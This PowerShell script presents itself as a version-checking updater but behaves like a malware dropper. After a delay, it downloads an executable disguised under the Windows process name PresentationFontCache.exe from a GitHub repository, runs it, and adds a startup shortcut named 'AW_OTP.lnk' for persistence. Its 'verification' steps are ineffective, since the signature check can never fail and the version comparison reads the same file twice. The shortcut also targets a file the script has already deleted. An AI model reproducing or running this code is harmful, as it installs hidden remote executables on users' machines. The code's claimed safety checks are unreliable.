function Download-File {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$Url,
        [Parameter(Mandatory)]
        [string]$FilePath
    )

    try {
        # Verify SSL/TLS certificate of the server
        $webClient = New-Object System.Net.WebClient
        $webClient.ServerCertificateValidationCallback = {
            param ($sender, $certificate, $chain, $sslPolicyErrors)
            return $sslPolicyErrors -eq 'None'
        }
        $webClient.DownloadFile($url, $filePath)

        # Verify digital signature of the downloaded file
        $signature = Get-AuthenticodeSignature -FilePath $filePath
        if (!$signature) {
            throw "Failed to verify digital signature of downloaded file."
        }

        Write-Verbose "File downloaded successfully."
    } catch {
        Write-Error "Failed to download file: $_"
    }
}

function Install-File {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$FilePath
    )

    try {
        # Execute the downloaded file
        $shell = New-Object -com shell.application
        $shell.shellexecute($filePath)

        # Delete the file from the temporary directory
        Remove-Item -Path $filePath -Force

        Write-Verbose "File installed successfully."
    } catch {
        Write-Error "Failed to install file: $_"
    }
}

# Pause the script for 30 seconds
Start-Sleep -Seconds 30

# Set the security protocol to TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download the version file from Github
$versionUrl = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$tempVersionFilePath = Join-Path -Path $env:TEMP -ChildPath 'version.txt'
Download-File -Url $versionUrl -FilePath $tempVersionFilePath

# Read the current version from the local file
$localVersionFilePath = Join-Path -Path $env:TEMP -ChildPath 'version.txt'
$currentVersion = Get-Content -Path $localVersionFilePath

# Read the latest version from the downloaded Github file
$latestVersion = Get-Content -Path $tempVersionFilePath

if ($currentVersion -ne $latestVersion) {
    # Download the file
    $url = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
    $tempFilePath = Join-Path -Path $env:TEMP -ChildPath 'PresentationFontCache.exe'
    Download-File -Url $url -FilePath $tempFilePath

    # Install the file and create a shortcut in the startup folder
    if (Test-Path -Path $tempFilePath -PathType Leaf) {
        Install-File -FilePath $tempFilePath
        $startupFolder = Join-Path -Path $env:USERPROFILE -ChildPath 'Start Menu\Programs\Startup'
        $shortcutPath = Join-Path -Path $startupFolder -ChildPath 'AW_OTP.lnk'
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $tempFilePath
        $shortcut.Save()

        # Update the local version file with the latest version
        Set-Content -Path $localVersionFilePath -Value $latestVersion
    }
}
